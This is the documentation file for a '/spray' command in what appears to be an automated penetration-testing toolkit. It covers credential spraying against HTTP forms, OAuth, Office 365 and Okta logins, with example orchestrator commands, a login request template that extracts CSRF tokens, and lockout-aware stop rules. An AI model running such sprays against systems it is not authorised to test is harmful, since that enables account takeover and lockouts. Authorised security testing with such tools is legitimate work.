---
description: Controlled credential spray with input-bound dry-run, explicit HTTP signals, unified audit, stop reasons, private evidence, and resume. Modes http-form/oauth/o365/okta.
---

# /spray

Controlled credential spray。`/autopilot` 仅在登录价值、用户名来源、AI shortlist、成功/失败信号和锁定条件均有证据时选择本 lane；发现登录页本身不触发 Spray。

## 基本流程

```bash
# 1. 零认证请求，生成 input-bound preflight
tools/spray_orchestrator.sh https://target.test/login \
  --mode http-form --users users.txt --passes spray-shortlist.txt \
  --request-spec request.json --dry-run

# 2. 无人值守 live 必须显式携带上一步文件
tools/spray_orchestrator.sh https://target.test/login \
  --mode http-form --users users.txt --passes spray-shortlist.txt \
  --request-spec request.json --preflight recon/<key>/spray/preflight-<id>.json \
  --i-understand

# 3. 中断后使用原输入恢复
tools/spray_orchestrator.sh https://target.test/login \
  --mode http-form --users users.txt --passes spray-shortlist.txt \
  --request-spec request.json --resume recon/<key>/spray/<run-id> --i-understand
```

`--i-understand` 只跳过交互提示；URL、输入、mode contract、preflight binding、停止和证据规则仍执行。交互 live 保留兼容，但同样应先 dry-run。

`spray-shortlist.txt` 与同目录 `spray-shortlist.jsonl` 均须为 `0600`。JSONL 顺序与密码一致，
每行包含 `schema_version=1`、`pwd_sha256_prefix`、`source`、`hibp_count`、`hibp_bucket`、
`reason`。入口拒绝 candidate pool/ranked alias、缺失 metadata 或摘要漂移。

## 模式

| 模式 | 契约 |
|---|---|
| http-form | form/JSON/GraphQL request spec，per-user CookieJar，per-attempt CSRF |
| oauth | 仅适用于已观察到 password grant 的端点；非空顶层 `access_token` 才成功 |
| o365 | TREVORspray `msol` module |
| okta | TREVORspray `okta` module |

HTTP/OAuth 默认验证 TLS。自签名环境可显式使用 `--insecure`，该选项会进入 preflight binding；
O365/Okta 不接受此参数。

## HTTP request spec

```json
{
  "schema_version": 1,
  "method": "POST",
  "url": "https://target.test/login",
  "headers": {"Accept": "application/json"},
  "body_format": "form",
  "body": {"username": "{USER}", "password": "{PASS}", "_token": "{CSRF}"},
  "csrf": {
    "url": "https://target.test/login",
    "regex": "name=\"_token\" value=\"([^\"]+)\"",
    "refresh": "per-attempt"
  },
  "success": {"body_regex": "Welcome", "redirect_regex": "^/dashboard", "cookie_name": "session"},
  "failure": {"body_regex": "Invalid credentials"},
  "guard": {"body_regex": "captcha|account locked", "status_codes": [429, 503]}
}
```

`body_format` 支持 `form|json`，body 可嵌套 JSON；结构化编码保证密码中的 `&`、`+`、引号不破坏请求。允许 `{USER}/{USERNAME}`、`{PASS}/{PASSWORD}`、`{CSRF}`，未知 placeholder 在 dry-run 失败。

旧 `--post-data/--csrf-extract/--success-regex/--fail-regex` 仍可用并投影到同一内部模型。request spec 与旧 form flags 不可混用。

## 判定与停止

- HTTP：`invalid_credentials`、`ambiguous_candidate`、`valid_session`、`rate_limited`、`guarded`、`network_error`。
- failure regex 消失只产生 `ambiguous_candidate` 并停止，不直接声明有效凭据。
- OAuth：非空顶层 token 才是 `valid_token`；429/503、provider error 和无 token 200 分开处理。
- OAuth 只有 `invalid_grant` 表示凭据无效；`invalid_client`、`invalid_request`、401 等配置或策略错误保持 ambiguous 并停止。
- 默认第一个明确 valid 停止；首个 rate-limit/guard/ambiguous 停止；连续 3 次网络错误停止。
- 顺序固定为 `password → all users`；`--delay/--jitter` 表示账号轮次间隔。TREVOR adapter 按用户名数换算为每请求间隔。

## 证据

```text
recon/<target-key>/spray/<run-id>/
├── run.json
├── attempts.jsonl
└── summary.json

.private/spray/<target-key>/<run-id>/
├── response-*.json
└── trevor-home/
```

普通证据只保存密码 hash prefix 和脱敏分类；token、session、响应正文及 TREVOR 明文历史只进入 0600/0700 的 `.private`。四种模式共享 `schema_version=1`、run ID、classification、stop reason 和完成 marker。输入 digest 变化时 preflight/resume fail-fast。

TREVOR live 使用 private 目录内的去重 users/passwords 副本，保证实际输入和 preflight 一致。
`--resume` 只接受无 summary、`interrupted` 或 `error` run；completed、valid、ambiguous、
guarded、rate-limited 和 locked 必须重新生成 preflight。并发 resume 会被 run lock 拒绝。

命中凭据不自动成为 finding；后续仍通过既有认证后验证流程证明影响。
